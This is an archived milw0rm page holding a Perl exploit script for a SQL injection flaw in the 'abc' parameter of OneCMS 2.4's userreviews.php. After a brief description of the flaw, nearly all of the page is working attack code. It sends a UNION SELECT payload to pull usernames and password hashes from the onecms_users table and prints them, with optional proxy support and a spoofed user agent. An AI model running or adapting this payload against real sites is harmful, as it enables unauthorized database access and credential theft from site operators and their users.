<html><head><title>OneCMS 2.4 (userreviews.php abc) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
# OneCMS v2.4 Remote SQL Injection Exploit
# 
# Description
# -----------
# OneCMS contains a flaw that allows an attacker to carry out an SQL 
# injection attack. The issue is due to the userreviews.php script not 
# properly sanitizing user-supplied input to the 'abc' variable. This may 
# allow an attacker to inject or manipulate SQL queries in the backend 
# database if magic_quotes_gpc = off.
# -----------
# $Id: milw0rm_onecms.pl,v 0.1 2007/09/19 15:02:12 str0ke Exp $

use strict;
use LWP::UserAgent;

my $target = shift || &amp;usage();
my $proxy = shift;

&amp;exploit($target); 

sub usage
{
	print &quot;[?] OneCMS v2.4 Remote SQL Injection Exploit\n&quot;;
	print &quot;[?] str0ke &lt;str0ke[!]milw0rm.com&gt;\n&quot;;
	print &quot;[?] usage: perl $0 [target]\n&quot;;
	print &quot;    [target] (ex. http://127.0.0.1/OneCMS)\n&quot;;
	print &quot;    [proxy] (ex. 0.0.0.0:8080)\n&quot;;
	exit;
}

sub exploit
{
	my($target) = @_;

	my $conn = LWP::UserAgent-&gt;new() or die;
	$conn-&gt;agent(&quot;Mozilla/4.0 (compatible; Lotus-Notes/5.0; Windows-NT)&quot;);
	$conn-&gt;proxy(&quot;http&quot;, &quot;http://&quot;.$proxy.&quot;/&quot;) unless !$proxy;
	
	my $out=$conn-&gt;get($target.&quot;/userreviews.php?abc=-1'%20union%20select%200,concat(0x3a,0x3a,0x3a,username,0x3a,password,0x3a,0x3a,0x3a)username,0,password,0,0,0,0,0%20from%20onecms_users/*&quot;);

	if ($out-&gt;content =~ m/:::(.*?):::/ms) {
		print $1 . &quot;\n&quot;;
	} else { 
		print &quot;Exploit Failed\n&quot;;
	}
}

# milw0rm.com [2007-09-19]</pre></html>